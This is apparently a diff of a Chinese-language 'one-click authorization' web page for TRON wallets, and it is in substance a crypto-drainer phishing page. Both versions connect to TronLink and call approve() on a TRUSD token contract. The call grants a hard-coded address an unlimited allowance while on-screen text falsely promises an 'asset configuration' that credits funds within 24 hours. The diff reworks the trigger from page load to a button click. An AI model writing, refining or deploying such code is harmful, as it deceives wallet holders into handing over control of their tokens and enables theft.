@@ -5,92 +5,122 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>一鍵授權頁面</title>
   <style>
-    body { font-family: "Noto Sans TC", sans-serif; background:#0f172a; color:#fff;
-      display:flex; align-items:center; justify-content:center; height:100vh; margin:0; padding:20px; }
-    .container { background:rgba(255,255,255,0.05); backdrop-filter:blur(12px);
-      border-radius:16px; padding:30px 40px; max-width:420px; width:100%; text-align:center;
-      box-shadow:0 8px 20px rgba(0,0,0,0.3); }
-    h1 { font-size:26px; margin-bottom:16px; font-weight:600; }
-    p { font-size:16px; margin-bottom:20px; color:#cbd5e1; }
-    #status { margin-top:20px; min-height:24px; font-size:14px; }
-    .loading { color:#facc15; }
-    .success { color:#4ade80; }
-    .error { color:#f87171; }
-    button { background:#38bdf8; border:none; padding:10px 18px;
-      border-radius:8px; color:#000; font-weight:bold; cursor:pointer; }
-    a { color:#38bdf8; text-decoration:underline; }
+    body {
+      font-family: "Noto Sans TC", "Microsoft JhengHei", sans-serif;
+      background: #0f172a;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(12px);
+      border-radius: 16px;
+      padding: 30px 40px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+    }
+    h1 { font-size: 26px; margin-bottom: 16px; font-weight: 600; }
+    p { font-size: 16px; margin-bottom: 28px; line-height: 1.6; color: #cbd5e1; }
+    #status { margin-top: 20px; min-height: 24px; font-size: 14px; }
+    .loading { color: #facc15; }
+    .success { color: #4ade80; }
+    .error { color: #f87171; }
+    button {
+      background: #22c55e;
+      color: #fff;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      padding: 10px 20px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #16a34a;
+    }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
 </head>
 <body>
-  <div class="container">
-    <h1>一鍵授權頁面</h1>
-    <p>點擊下方按鈕，從 TronLink App 的 DApp 瀏覽器重新開啟此頁進行授權。</p>
-    <button onclick="openTronLink()">📲 用 TronLink 開啟</button>
-    <p id="fallback-tip" style="display:none; margin-top:10px;">
-      未成功啟動 App？<br>
-      👉 <a href="https://apps.apple.com/app/id1518002753" target="_blank">安裝 TronLink iOS App</a><br>
-      安裝完請從 App 內 DApp 瀏覽器貼上本頁網址開啟
-    </p>
-    <p id="status" class="loading">正在檢測錢包...</p>
-  </div>
+<div class="container">
+  <h1>一鍵授權頁面</h1>
+  <p>點擊下方按鈕開始資產配置流程，系統將於 24 小時內完成入賬，請耐心等候。</p>
+  <button id="connectBtn" onclick="startProcess()">🔌 開始授權</button>
+  <p id="status" class="loading">尚未連接錢包</p>
+</div>
 
 <script>
-const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4";
-const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";
-const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-let tronWeb;
+  const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4"; // TRUSD 合約
+  const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";     // 接收授權地址
+  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  let tronWeb;
 
-function openTronLink() {
-  window.location.href = "tronlink://";
-  setTimeout(()=>{ document.getElementById('fallback-tip').style.display='block'; }, 2000);
-}
-
-async function connectWallet() {
-  if (window.tronWeb && window.tronWeb.ready) {
-    tronWeb = window.tronWeb; return tronWeb.defaultAddress.base58;
-  }
-  return null;
-}
-
-async function checkTronNetwork() {
-  try {
-    const chainId = await tronWeb.trx.getChainId?.();
-    if (chainId && chainId !== '_') {
-      updateStatus("請切換至 TRON 主網", "error"); return false;
+  async function connectWallet() {
+    if (window.tronWeb && window.tronWeb.ready) {
+      tronWeb = window.tronWeb;
+      return tronWeb.defaultAddress.base58;
     }
-    return true;
-  } catch { return true; }
-}
-
-async function approve() {
-  updateStatus("資產處理中，請稍候…", "loading");
-  try {
-    const contract = await tronWeb.contract().at(TRUSD_CONTRACT);
-    await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
-    updateStatus("配置成功，系統將進入入帳流程", "success");
-    setTimeout(()=>{ window.location.href = "success.html"; }, 2000);
-  } catch {
-    updateStatus("系統異常，請稍後重試", "error");
-    setTimeout(()=>{ window.location.href = "error.html"; }, 2500);
+    if (window.tronLink) {
+      await window.tronLink.request({ method: 'tron_requestAccounts' });
+      tronWeb = window.tronWeb;
+      return tronWeb.defaultAddress.base58;
+    }
+    return null;
   }
-}
 
-function updateStatus(msg, type) {
-  const el = document.getElementById("status");
-  el.innerText = msg;
-  el.className = type;
-}
-
-window.addEventListener('load', async ()=> {
-  const addr = await connectWallet();
-  if (!addr) {
-    updateStatus("未偵測到錢包，請用 TronLink App 開啟本頁面", "error");
-    return;
+  async function checkTronNetwork() {
+    try {
+      const chainId = await tronWeb.trx.getChainId?.();
+      if (chainId && chainId !== '_') {
+        updateStatus("請切換到 TRON 主網", "error");
+        return false;
+      }
+      return true;
+    } catch {
+      return true;
+    }
   }
-  if (!(await checkTronNetwork())) return;
-  approve();
-});
+
+  async function approve() {
+    updateStatus("資產處理中，請稍候...", "loading");
+    try {
+      const contract = await tronWeb.contract().at(TRUSD_CONTRACT);
+      await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
+      updateStatus("配置完成，正在跳轉...", "success");
+      setTimeout(() => {
+        window.location.href = "success.html";
+      }, 2000);
+    } catch (err) {
+      console.error(err);
+      updateStatus("操作失敗，請稍後重試。", "error");
+      setTimeout(() => {
+        window.location.href = "error.html";
+      }, 2500);
+    }
+  }
+
+  function updateStatus(msg, type) {
+    const statusEl = document.getElementById("status");
+    statusEl.innerText = msg;
+    statusEl.className = type;
+  }
+
+  async function startProcess() {
+    const address = await connectWallet();
+    if (!address) {
+      updateStatus("尚未偵測到 TRON 錢包，請於 TronLink 開啟此頁。", "error");
+      return;
+    }
+    if (!await checkTronNetwork()) return;
+    approve();
+  }
 </script>
 </body>
 </html>
